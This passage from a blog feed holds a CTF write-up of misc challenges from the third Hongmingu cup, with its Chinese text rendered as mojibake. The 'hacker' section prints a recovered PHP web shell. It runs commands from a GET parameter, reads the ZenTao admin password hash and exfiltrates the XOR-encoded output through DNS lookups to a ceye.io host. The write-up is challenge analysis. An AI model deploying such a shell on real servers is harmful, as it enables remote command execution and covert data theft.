718b3508f81e0677753587df0d7755566455fe822555d53ec4ba647eca2bf4e8ac5db0a5075fb02454701e2c9f20e5548fe68b3810dcb9e210c0ea2e67fcc0db7a7bf92c14fde46cb5d2ed3ddfd1b46ff8e022c21049e886788020f768b90f5ee5323faaa4ba4a96790c84dc67222f5b9050a0bf32bf0b0a0529e95104f7e9faabba8273dc383b42e470a60854fcdadf32278289f72f2536b722899c952d08ce34f4f87892f768cf74c531e246da9f0dcbe3957daaf52353cd376bb7d31a3ddfb0a32b4d13a2d0d89b4fed417e8a5a7b1d1b68896661357494784e4fd62147c8e487e5c9e0ca56d2c37105e6b4614516a665850b3e3461835caec141464ea9b15f882f45eb8529dc13894597ed6dad80760d6839228466f78f73fad44462a3f17c9ad83ab07eab50e71f6c0ab4e04672c985d569be4988a8d5d455696babd1c0401166805617f2b2e3b1c7c3e17741a047f49120ff5d38e515f8d3cb092a526e37ea73bff08e8fd72eeda0e0c628f64248b898cf3cc6d31382bc08c98d05c285f5bfac25352a5ac12c3cf691e6d260925c0fd320642046723a7b691859faf8370774aa8991ddcd4699e4cb5f860ca5dd2d02b83513ef86b697fc51254655eb6e710d5c3016a90856519f22a1b9de032849ba507a44da08ce9d9f5d2af20584d4ac5e4a88066b9318ed12d4334b272e6925280595bfcd7b4dc9242451d3769822b4a5ad7f23d7c8428ba02774aa214039e532b65b44e398bf8707f5f4308b11251e4080b2a6d1a5c8f86f8e0db9207e03c560e3460b90d87470c987b8991fb0509c7480d7cfd96ab60d8eb6311a88aac156580234a8d60bd0252b48a67e42b7dee0970d65d65d965caf7e04039853fdc6228f8d9d8507dbaa8f208252545e9d74d87db04bc93bc10d3a4310554f33a2a741f9f974c620d590dd880985bdc3168b368485456bd31e5c8f3d0853059f51419e4ce7d6525eef82c4744b48cbde6fe0feee2eb05c0a8bd4d5255db0face58a6d556b6b1e326039885c9005d56a2b66c806bdeb48cf59a0aa82f3fc15c2f9604518ce48171571a3c7f1c3f9c73c47d923aaeef368174f477339e7e9315a23edb5319179437bf8f2384cd315cb1cbf6bb15d7471c789d754276874952c2498a44449ee7a20d3ce03a2b90ca6c012c035cf60ce188d9eba0efaa7ba6f65b48fc8f7f2456e41400b3b3cfc016aa2eb291f54296313599ea0bc6cb52de9ee21102e3b37601b3ffb73181318e8c87bf28f8c71dcc7598ac1ad6e130d76db6f57ce88f08958c830db09a91369090686ebe916de950b4d58fd6258b83896f0b034d2d0fda218880f9a2ba3af327757ed57deccefc4e393ce0d210a9bb4ce14031184d665582787686a0f5275cffafc17044a24a0cc096bccaa4a85a1a6fb911544ec653f09884edab11b8bdb38321c5f46ef37831d247a61b35f90aa8b40a1fc18da53009a9cb6237e32994a182af1c0b955a98cb0ec49e7cf60244e0b7f84ae196fa6961006f3fc478b235b4d6a3504d0e19338c6641479be15daa95d799bc294c4dac1796550824b0b8d8bb6d6a17612995e05a1ca357d18993d3692aa92357358a84685abf5965687cbe8684fbacc8b072bd9929005ccd52e8a2507fdbdc4a71003f136405e6f44a881b65e4907fdb53dc042cb6dda149add2c551d7fe0228ee540494d7238b79929043138c191a89769a7f60c1d54b71c657b242ee504a35a3982053c602d0d0b0a7b0bc3be6459b67b29d2706edb1bbdce5113cdf8bc2ad5655f894732387debedffb5351db42efe8d03c0f5b06f88494eb99541cbfeace7d7755c6fdd60678e8985583e6e1b6bab897814411724da3ccc90734bf5a242717242907b64d5026870e6fafb30372e099ee6ed9a483e7b88783221f71ea38a15cd694736e7ce02d7f06c1ddebb436f6993659c86f78f3f83e751b18769a080cb205ea1289e0a9ac5e49c97431e90893d0b3a45573f067c3b1d050fc40b6d7380c7ce253f1ee60d7e7b8a3c0b83a3afd0c97ff2a1c520101f4b50f655dce0e43850371350d445f0cab81cdfc7d539001dde4f3ee30f61460524e12f7920bdf046ecacd9509c01aea6a399e78f9220e389f670537b2bc83c7c40d853dedd2a6d35782e523bc9687d1a434b7720f69d5800a1883c771aa0d16a056b3fd6268ec9c79466f68beadca87bd0b3ea6adb9ca7ab48e167b059ca7fb1138b0bd3666d9477c3b5a21b909d2f5e467194143e63fb6064a1ebd52dea06aac282b8cd9bdb84abd8296bcbf449cd817b9d9fd793af4022468b00737308de2e4ea7ad3d4c49e2b7c7188a28632ba7221eb39b4c18ed27ee681c01bd70629f95a8ab5df61c2a648e2fb87fd74f139c0c61825bd01ba03ecefec49a2eaed927b1b025f3d08a34f9732468b5546306121ad312c259945bdc6894798fb32f093dace5971dda646f4eeaa63ef497f9a08661a0adf3f13b900289665c41f094f74c2d37bb850a569b2e08f79c824a00024b385f15953eac86bc6e0987e933eaeb036731f850c5048022bb0a789acd51926a2088fe5fae715ca21638bc81a9b123111673baebb321bbf063a870a5350dd141d3094715ae022f013b6701ecf59ae84fb2e77522b64fcd76a2d0fbc5c6b6d46941c49c104ecce3a697fe33e374d7da8af8766d12bdfac31693694e93912febe8c9b326c495148ff7bce32f49cb0562ef312b6907665698244a8d7aa91a549c387b7847ef50736c78131d48bfe970b03daed0bab9820ceb7f9521568cc7dbcebfd94345ec535d25162fe4c00c3b0df6b74cadbbfeb8ee977f002f84ddd527e057cbf3c4fa8048c04108ba7aa4035eb9355dd008df8e79f1e4d9022a910801a80700ae477d7f031d48ae1014a2bf136f51c58f7aee20e89d3a92adecfe6abdab90cdb5eeef24e0037552e17c385c59c54d3419812265b7514368dfbff68d3789278757c5b3162d0240c5a4fb4dbbf6de1c7eb4f0200c2ab11f137b1548bd7bdf5c10d23902c239a6b2deb1f55ea109d3a494fe8fe7e8c76bdd67e5cec9c9c07bfdf7137de29e98073c95c5d79234fe90cf481636de5a5f76171a768a41c34987142414b770a7ddc7bce194ede007c84208494331576257db2fddf0824bb9b83f27d4e232af3a56b5d33a87d1687d8c744ea3a76de6bcaba27b04d390c6ad2cd68911878e581e1964850b782628f43a8984505ff55235c2ca022a1888b009a4e0dfe65da3e729a42d09f580d52d37291f830b1771a0ab825dd2794a6e3bf372250a1fa0c09133b373aeabb179abbe4bf4a462b234054e70abf26a10392a9badf444f4e1487f42c9150f765dc9b766d17c74306b92c5444b6e5d74b5205d8564d524f452371c4b390a8a9629136d04ff0dd568ddc2df3e4f7c92ff4198046bfeb4909e819fb7611677db321a22d6826fe51ea17d67e8cffca07388e930526049827f16ebcdec7fe51ee8529d91263328905da2ab3dcdc8705acf1344f5b4562637a279b7714aa26da88bfee1c4621f6fbb95d458adc32ca25e71987fe0b44237cd920758535aac4bf7f2767ad872cd253230ab29053d8dbe32695d2c78ef86c8b1ef50d379f3f95eeda0e1f8b670523a5ac132a6671e9b3c7b4fe8bef2d80e907842c36e43f799cb26c4cdf1eb9c29576a299ab2676941d6c5c34af8fbe17ab58e80010b2abad69ccc51615c1e3bb7c20c42e47e975ca9aaad4a56b985f11ecd839ca21b67bc057cd0369c5dcfec75671e24b145190a68792aa0370487f1bdfaf9665e0726d962f47e449ad9f37f1658949806d4c60ea358d9596c3df589304fe4653606158c8424e66a446c307a9598bf53cf442d14f00141e45d4b763dbb2b3a5d3cb8e40cdb6f8be7479313340ea0e3a8ad437516aff32c6e2d51b9becadbae10c6bea3e29fa070855f6195752e0f68f3eb6460d1ea5215f5d821c050a93cf079ca382be73ba5bcea0083387359b663425d14a07aa90a2b2665d1e43da8b7addfcf2e812535745343fe4dd882c8aa54d13c976306e085ef994350a067e902855739c19365b7107e9e7398b81bc1dd6092c287a0155ce4aee4fdc0f9d4aa162ffbd05f4ed978b75a7ffec9a8896a2c5c3e56142545878b10346166c33c29746b048d5c6530ea606420edd5aa791153d114e4c17ce1e995bf5dc723bfee2e8cbe4cb4222e1e4fe369ef254d17ffe1034ab72bfded2b6bdbc73c61f400cd68b0dc7bdcb76d7679f1748ae6447d7f62c4adbfcc4f2496b2e49b6c465b4ab3c01ea952f77def5dd43a0c2848200cac33952c5fd071b9d7a0e614cf0cc23e7d7eaceaa42c5516b6f84c99707ab44e664cd54eed0d6f9a89c8eb7d395fa88d1bc35c0cfc46c15e1e2778187a8b677e03bee7ca9b4731d1e01ab22802365ed0fd0281b1222e4c397910c72888493cb04af877cfa1a3c95b1f1ed06d8c955e47cc2e5a1e0ced1cdf92497ad420d720396c03133a131d4fdaa04872c53e17a8f8607392b4d29870987c566c3f6487dd43be271f664b4c5b5d7c6a9a8359b1238c91845a8d592a7b30149370e16a8a660c053584daf3cb2f1d78bf70769013192ab3ca1e851513d7b878f64f1d614298c57e7a9e80a925584c1eed6b4b525a6e273b5174373a52850c952b69c1060330b9a57411ee14356bb499323af2ec6176f3bf91e387f544e64a8f4c5d2f8d0fb4b9aa7ac00fbc1a2267762c4c0e97a390846c6427f5f285ffa161bfeb84c9cdc29e2d87f4042f26fb8f9aecc3ea1f5bb594d78e716b6586d04b498086cba8959f35ddb8ccbc283ef1951ed1d3664b2098de05399869e1b592b788aa820960632441270c2a1e2c1ea73e84a6b4526c112ae09108c1ce516e3bd916e351d57f1d8c6d605cb76ec8af7763d233a0947c1f99df381ffcc558b13d578c0123d411bfae7636ccb1f5274f6b74ccf2ef2a2dcb066c9f4fcb3859330a8d5e085162c10f4919611dacbbff2ea68a7844fbca543b7d0f75330d91e7c3c6c20bcb6249884e1455a0be22ead17c33ed79667e7949aaf1a1e8687b1cf34b144a7d4ce6056fa38bcd850cb785a4b081958f2c55120bfa5b21f0bff7b953a5958a8fbe319bebf7f1d4b5c405dc519dd1bab56eef10</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>hw</category>
      </categories>
      <tags>
        <tag>hw</tag>
        <tag>é¢è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¬¬ä¸‰å±Š&quot;çº¢æ˜è°·&quot;æ¯ç½‘ç»œå®‰å…¨å¤§èµ›wp</title>
    <url>/posts/86dd8190/</url>
    <content><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="é˜¿å°¼äºš"><a href="#é˜¿å°¼äºš" class="headerlink" title="é˜¿å°¼äºš"></a>é˜¿å°¼äºš</h2><p>æ–‡ä»¶å°¾æœ‰ä¸€ä¸²å­—ç¬¦ä¸²<code>6333383363333963633338326333616263333865633261616332613363326261633262636333623263326235633261356332623563333834633262316333613063333832633361623061</code>ï¼Œåå…­è¿›åˆ¶è½¬å­—ç¬¦ä¸²å¾—åˆ°<code>c383c39cc382c3abc38ec2aac2a3c2bac2bcc3b2c2b5c2a5c2b5c384c2b1c3a0c382c3ab0a</code></p>
<p>C383æ˜æ˜¾æ˜¯ä¸­æ–‡ç¼–ç ï¼Œè½¬åå…­è¿›åˆ¶åçˆ†ç ´å¾—åˆ°å¯†ç <code>ç®€å•çš„ç¼–ç </code></p>
<p><img src="/img/wp/2023/2023hmg-1.png"></p>
<p>æ ¹æ®å›¾ç‰‡åå­—<code>netpixeljihad</code>ï¼Œä½¿ç”¨<code>PixelJihad</code>è§£å¯†ï¼Œå¯†ç æ˜¯<code>ç®€å•çš„ç¼–ç </code></p>
<p><img src="/img/wp/2023/2023hmg-2.png"></p>
<p>å¾—åˆ°å‹ç¼©åŒ…çš„å¯†ç <code>P@Ss_W0RD:)</code></p>
<p>è§£å‹å¾—åˆ°<code>+-+-++--+- ++---+-++- -+--++-++- +--++-++-- --+++++--- ++-++---+- +++-+-+--- +-+-+---++ ---+++-++- -+--++-++- -+--+++-+- -+--++-++- -+--++-++- ++-+-+-+-- -+--+++-+- ++-++---+- -++++---+- -+--++-++- ++-+-+-+-- +-+++---+- +++-++---- ---+++-++- +-+-+---++ ++-+-+-+-- +-+-+--++- ++--+--++- -++++---+- +---+++-+- ++-+-+-+-- -++++---+- -+--+++-+- +--+-+-++- +++-+-+--- +-+++---+- -+--+-+++- -+--++-++- ---+++-++- ++++----+- -++++---+- -+--+++-+- -+--++-++- ----+++++-</code></p>
<p><a href="https://www.dcode.fr/code-decabit">åœ¨çº¿è§£å¯†</a>ä¸€æŠŠæ¢­</p>
<p><img src="/img/wp/2023/2023hmg-3.png"></p>
<h2 id="hacker"><a href="#hacker" class="headerlink" title="hacker"></a>hacker</h2><p>æµé‡åˆ†æï¼Œå‘ç°æœ‰ä¸ª<code>shell.php</code>ä¸Šä¼ äº†ä¸€ä¸ª<code>xxx1.php</code>ï¼Œç„¶åæ‰§è¡Œäº†<code>ls</code>å’Œ<code>cat secret.txt</code></p>
<p>æ ¼å¼åŒ–åå¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$servername</span>=<span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;123456&quot;</span>;<br><span class="hljs-variable">$dbname</span>=<span class="hljs-string">&quot;zentao&quot;</span>;<br><span class="hljs-variable">$conn</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&quot;mysql:host=<span class="hljs-subst">$servername</span>;dbname=<span class="hljs-subst">$dbname</span>&quot;</span>,<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br><span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">setAttribute</span>(PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span>,PDO::<span class="hljs-variable constant_">ERRMODE_EXCEPTION</span>);<br><span class="hljs-variable">$stmt</span>=<span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;SELECT password FROM zt_user WHERE account=\&#x27;admin\&#x27;&quot;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br><span class="hljs-variable">$result</span>=<span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>(PDO::<span class="hljs-variable constant_">FETCH_ASSOC</span>);<br><span class="hljs-variable">$conn</span>=<span class="hljs-literal">null</span>;<br><span class="hljs-variable">$param</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$result</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-variable">$output</span>=<span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$param</span>);<br><span class="hljs-variable">$hex_output</span>=<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$output</span>);<br><span class="hljs-variable">$hex_password</span>=<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$password</span>);<br><span class="hljs-variable">$len_output</span>=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hex_output</span>);<br><span class="hljs-variable">$len_password</span>=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hex_password</span>);<br><span class="hljs-variable">$max_subdomain_length</span>=<span class="hljs-number">62</span>;<br><span class="hljs-variable">$subdomain_base</span>=<span class="hljs-string">&quot;yafgcy.ceye.io&quot;</span>;<br><span class="hljs-variable">$hex_xor</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$len_output</span>;<span class="hljs-variable">$i</span>++) &#123;<br>	<span class="hljs-variable">$char_output</span>=<span class="hljs-variable">$hex_output</span>[<span class="hljs-variable">$i</span>];<br>	<span class="hljs-variable">$char_password</span>=<span class="hljs-variable">$hex_password</span>[<span class="hljs-variable">$i</span>%<span class="hljs-variable">$len_password</span>];<br>	<span class="hljs-variable">$char_xor</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$char_output</span>)^<span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$char_password</span>));<br>	<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hex_xor</span>.<span class="hljs-variable">$char_xor</span>)&gt;<span class="hljs-variable">$max_subdomain_length</span>) &#123;<br>		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hex_xor</span>)%<span class="hljs-number">2</span>!=<span class="hljs-number">0</span>) &#123;<br>			<span class="hljs-variable">$subdomain</span>=<span class="hljs-string">&quot;0&quot;</span>.<span class="hljs-string">&quot;<span class="hljs-subst">$hex_xor</span>.<span class="hljs-subst">$subdomain_base</span>&quot;</span>;<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			<span class="hljs-variable">$subdomain</span>=<span class="hljs-string">&quot;<span class="hljs-subst">$hex_xor</span>.<span class="hljs-subst">$subdomain_base</span>&quot;</span>;<br>		&#125;<br>		<span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$subdomain</span>);<br>		<span class="hljs-variable">$hex_xor</span>=<span class="hljs-string">&quot;&quot;</span>;<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		<span class="hljs-variable">$hex_xor</span>.=<span class="hljs-variable">$char_xor</span>;<br>	&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hex_xor</span>)%<span class="hljs-number">2</span>!=<span class="hljs-number">0</span>) &#123;<br>	<span class="hljs-variable">$subdomain</span>=<span class="hljs-string">&quot;0&quot;</span>.<span class="hljs-string">&quot;<span class="hljs-subst">$hex_xor</span>.<span class="hljs-subst">$subdomain_base</span>&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>	<span class="hljs-variable">$subdomain</span>=<span class="hljs-string">&quot;<span class="hljs-subst">$hex_xor</span>.<span class="hljs-subst">$subdomain_base</span>&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$subdomain</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>å‘ç°æ˜¯<code>dns</code>æµé‡</p>
<p>æå–å‡º<code>secret.txt</code>ï¼Œæ ¹æ®ä»£ç å¯çŸ¥è¦ä¸<code>admin</code>çš„å¯†ç è¿›è¡Œå¼‚æˆ–</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">79227024716c7522787370254c777230667673222570247b76677322632671<br>d7b357226771575227a7372237677702573611f372570317b7672772076206<br>1479207024777b60247e6674231a626727666171372570317f766773207620<br>067879226731756c60206d75703670754e<br><br>password:8a3e684c923b763d252cf1e8734a7a29<br></code></pre></td></tr></table></figure>

<p>å¼‚æˆ–åå‘ç°æ˜¯<code>DNA</code>ç¼–ç ï¼Œæ¯62ä½ä¼šå°‘å†…å®¹ï¼Œçˆ†ç ´å°±è¡Œ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">mapping = &#123;<br><br><span class="hljs-string">&#x27;AAA&#x27;</span>:<span class="hljs-string">&#x27;a&#x27;</span>,<br><span class="hljs-string">&#x27;AAC&#x27;</span>:<span class="hljs-string">&#x27;b&#x27;</span>,<br><span class="hljs-string">&#x27;AAG&#x27;</span>:<span class="hljs-string">&#x27;c&#x27;</span>,<br><span class="hljs-string">&#x27;AAT&#x27;</span>:<span class="hljs-string">&#x27;d&#x27;</span>,<br><span class="hljs-string">&#x27;ACA&#x27;</span>:<span class="hljs-string">&#x27;e&#x27;</span>,<br><span class="hljs-string">&#x27;ACC&#x27;</span>:<span class="hljs-string">&#x27;f&#x27;</span>,<br><span class="hljs-string">&#x27;ACG&#x27;</span>:<span class="hljs-string">&#x27;g&#x27;</span>,<br><span class="hljs-string">&#x27;ACT&#x27;</span>:<span class="hljs-string">&#x27;h&#x27;</span>,<br><span class="hljs-string">&#x27;AGA&#x27;</span>:<span class="hljs-string">&#x27;i&#x27;</span>,<br><span class="hljs-string">&#x27;AGC&#x27;</span>:<span class="hljs-string">&#x27;j&#x27;</span>,<br><span class="hljs-string">&#x27;AGG&#x27;</span>:<span class="hljs-string">&#x27;k&#x27;</span>,<br><span class="hljs-string">&#x27;AGT&#x27;</span>:<span class="hljs-string">&#x27;l&#x27;</span>,<br><span class="hljs-string">&#x27;ATA&#x27;</span>:<span class="hljs-string">&#x27;m&#x27;</span>,<br><span class="hljs-string">&#x27;ATC&#x27;</span>:<span class="hljs-string">&#x27;n&#x27;</span>,<br><span class="hljs-string">&#x27;ATG&#x27;</span>:<span class="hljs-string">&#x27;o&#x27;</span>,<br><span class="hljs-string">&#x27;ATT&#x27;</span>:<span class="hljs-string">&#x27;p&#x27;</span>,<br><span class="hljs-string">&#x27;CAA&#x27;</span>:<span class="hljs-string">&#x27;q&#x27;</span>,<br><span class="hljs-string">&#x27;CAC&#x27;</span>:<span class="hljs-string">&#x27;r&#x27;</span>,<br><span class="hljs-string">&#x27;CAG&#x27;</span>:<span class="hljs-string">&#x27;s&#x27;</span>,<br><span class="hljs-string">&#x27;CAT&#x27;</span>:<span class="hljs-string">&#x27;t&#x27;</span>,<br><span class="hljs-string">&#x27;CCA&#x27;</span>:<span class="hljs-string">&#x27;u&#x27;</span>,<br><span class="hljs-string">&#x27;CCC&#x27;</span>:<span class="hljs-string">&#x27;v&#x27;</span>,<br><span class="hljs-string">&#x27;CCG&#x27;</span>:<span class="hljs-string">&#x27;w&#x27;</span>,<br><span class="hljs-string">&#x27;CCT&#x27;</span>:<span class="hljs-string">&#x27;x&#x27;</span>,<br><span class="hljs-string">&#x27;CGA&#x27;</span>:<span class="hljs-string">&#x27;y&#x27;</span>,<br><span class="hljs-string">&#x27;CGC&#x27;</span>:<span class="hljs-string">&#x27;z&#x27;</span>,<br><span class="hljs-string">&#x27;CGG&#x27;</span>:<span class="hljs-string">&#x27;A&#x27;</span>,<br><span class="hljs-string">&#x27;CGT&#x27;</span>:<span class="hljs-string">&#x27;B&#x27;</span>,<br><span class="hljs-string">&#x27;CTA&#x27;</span>:<span class="hljs-string">&#x27;C&#x27;</span>,<br><span class="hljs-string">&#x27;CTC&#x27;</span>:<span class="hljs-string">&#x27;D&#x27;</span>,<br><span class="hljs-string">&#x27;CTG&#x27;</span>:<span class="hljs-string">&#x27;E&#x27;</span>,<br><span class="hljs-string">&#x27;CTT&#x27;</span>:<span class="hljs-string">&#x27;F&#x27;</span>,<br><span class="hljs-string">&#x27;GAA&#x27;</span>:<span class="hljs-string">&#x27;G&#x27;</span>,<br><span class="hljs-string">&#x27;GAC&#x27;</span>:<span class="hljs-string">&#x27;H&#x27;</span>,<br><span class="hljs-string">&#x27;GAG&#x27;</span>:<span class="hljs-string">&#x27;I&#x27;</span>,<br><span class="hljs-string">&#x27;GAT&#x27;</span>:<span class="hljs-string">&#x27;J&#x27;</span>,<br><span class="hljs-string">&#x27;GCA&#x27;</span>:<span class="hljs-string">&#x27;K&#x27;</span>,<br><span class="hljs-string">&#x27;GCC&#x27;</span>:<span class="hljs-string">&#x27;L&#x27;</span>,<br><span class="hljs-string">&#x27;GCG&#x27;</span>:<span class="hljs-string">&#x27;M&#x27;</span>,<br><span class="hljs-string">&#x27;GCT&#x27;</span>:<span class="hljs-string">&#x27;N&#x27;</span>,<br><span class="hljs-string">&#x27;GGA&#x27;</span>:<span class="hljs-string">&#x27;O&#x27;</span>,<br><span class="hljs-string">&#x27;GGC&#x27;</span>:<span class="hljs-string">&#x27;P&#x27;</span>,<br><span class="hljs-string">&#x27;GGG&#x27;</span>:<span class="hljs-string">&#x27;Q&#x27;</span>,<br><span class="hljs-string">&#x27;GGT&#x27;</span>:<span class="hljs-string">&#x27;R&#x27;</span>,<br><span class="hljs-string">&#x27;GTA&#x27;</span>:<span class="hljs-string">&#x27;S&#x27;</span>,<br><span class="hljs-string">&#x27;GTC&#x27;</span>:<span class="hljs-string">&#x27;T&#x27;</span>,<br><span class="hljs-string">&#x27;GTG&#x27;</span>:<span class="hljs-string">&#x27;U&#x27;</span>,<br><span class="hljs-string">&#x27;GTT&#x27;</span>:<span class="hljs-string">&#x27;V&#x27;</span>,<br><span class="hljs-string">&#x27;TAA&#x27;</span>:<span class="hljs-string">&#x27;W&#x27;</span>,<br><span class="hljs-string">&#x27;TAC&#x27;</span>:<span class="hljs-string">&#x27;X&#x27;</span>,<br><span class="hljs-string">&#x27;TAG&#x27;</span>:<span class="hljs-string">&#x27;Y&#x27;</span>,<br><span class="hljs-string">&#x27;TAT&#x27;</span>:<span class="hljs-string">&#x27;Z&#x27;</span>,<br><span class="hljs-string">&#x27;TCA&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<br><span class="hljs-string">&#x27;TCC&#x27;</span>:<span class="hljs-string">&#x27;2&#x27;</span>,<br><span class="hljs-string">&#x27;TCG&#x27;</span>:<span class="hljs-string">&#x27;3&#x27;</span>,<br><span class="hljs-string">&#x27;TCT&#x27;</span>:<span class="hljs-string">&#x27;4&#x27;</span>,<br><span class="hljs-string">&#x27;TGA&#x27;</span>:<span class="hljs-string">&#x27;5&#x27;</span>,<br><span class="hljs-string">&#x27;TGC&#x27;</span>:<span class="hljs-string">&#x27;6&#x27;</span>,<br><span class="hljs-string">&#x27;TGG&#x27;</span>:<span class="hljs-string">&#x27;7&#x27;</span>,<br><span class="hljs-string">&#x27;TGT&#x27;</span>:<span class="hljs-string">&#x27;8&#x27;</span>,<br><span class="hljs-string">&#x27;TTA&#x27;</span>:<span class="hljs-string">&#x27;9&#x27;</span>,<br><span class="hljs-string">&#x27;TTC&#x27;</span>:<span class="hljs-string">&#x27;0&#x27;</span>,<br><span class="hljs-string">&#x27;TTG&#x27;</span>:<span class="hljs-string">&#x27; &#x27;</span>,<br><span class="hljs-string">&#x27;TTT&#x27;</span>:<span class="hljs-string">&#x27;.&#x27;</span><br><br><br>&#125;<br><br><br>encode_string = <span class="hljs-string">&#x27;OME&#x27;</span><br><br>decode_string = <span class="hljs-string">&#x27;GGAGCGCTG&#x27;</span> <br><br>inverted_mapping = <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">zip</span>(mapping.values(), mapping.keys()))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_dna</span>(<span class="hljs-params"> decode_string </span>):<br><br>    pieces = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>( <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(decode_string), <span class="hljs-number">3</span> ):<br>        piece =  decode_string[i:i+<span class="hljs-number">3</span>]<br>        <span class="hljs-comment"># pieces.append()</span><br>        pieces.append( mapping[piece] )<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(pieces)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_dna</span>(<span class="hljs-params">encode_string</span>):<br>    pieces = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> encode_string:<br>        piece =  inverted_mapping[i]<br>        pieces.append(piece)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(pieces)<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Decoded String is:- &#x27;</span>+ decode_dna(decode_string)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Encoded DNA String is:- &#x27;</span>+ encode_dna(encode_string)<br></code></pre></td></tr></table></figure>




<h2 id="Xå…‰çš„ç§˜å¯†"><a href="#Xå…‰çš„ç§˜å¯†" class="headerlink" title="Xå…‰çš„ç§˜å¯†"></a>Xå…‰çš„ç§˜å¯†</h2><p>ç»™äº†ä¸ª<code>task.dcm</code>æ–‡ä»¶ï¼Œç™¾åº¦åˆ°èƒ½æ‰“å¼€çš„è½¯ä»¶<a href="https://www.microdicom.com/downloads.html">MicroDicom</a></p>
<p>ä½¿ç”¨è½¯ä»¶å¯¼å‡ºï¼Œä¸€å…±æœ‰äºŒåå¼ </p>
<p><img src="/img/wp/2023/2023hmg-4.png"></p>
<p>ä½¿ç”¨stegsolveå‘ç°æœ€åä¸‰å¼ å›¾å­˜åœ¨LSB</p>
<p>è„šæœ¬æå–å‡ºæœ€ä½ä½æ•°æ®ï¼Œå› ä¸ºæ˜¯ç°åº¦å›¾ï¼Œæ‰€ä»¥ç”¨å…¶ä¸­ä¸€ä¸ªé€šé“å°±è¡Œäº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;img-00001-00018.png&#x27;</span>)<br>w,h=img.size<br><br>rgb=[<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>]<br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>        data=img.getpixel((i,j))<br>        rgb[<span class="hljs-number">0</span>]+=<span class="hljs-built_in">str</span>(data[<span class="hljs-number">0</span>]%<span class="hljs-number">2</span>)<br>        rgb[<span class="hljs-number">1</span>]+=<span class="hljs-built_in">str</span>(data[<span class="hljs-number">1</span>]%<span class="hljs-number">2</span>)<br>        rgb[<span 